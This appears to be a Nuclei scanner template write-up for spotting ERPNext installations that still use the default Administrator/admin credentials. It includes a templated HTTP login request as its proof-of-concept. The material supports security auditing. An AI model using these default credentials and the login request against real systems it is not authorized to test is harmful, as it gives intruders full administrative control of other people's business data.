# Nuclei Template: ERPNext - Default Login
**Template ID:** erpnext-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`erpnext-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detects ERPNext installations that use the default Administrator/admin login credentials. This misconfiguration grants attackers full administrative access to the system.

## Steps to reproduce / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

cmd=login&usr={{username}}&pwd={{password}}&device=desktop
```

## References
- https://github.com/frappe/erpnext
- https://github.com/frappe/erpnext/blob/develop/README.md
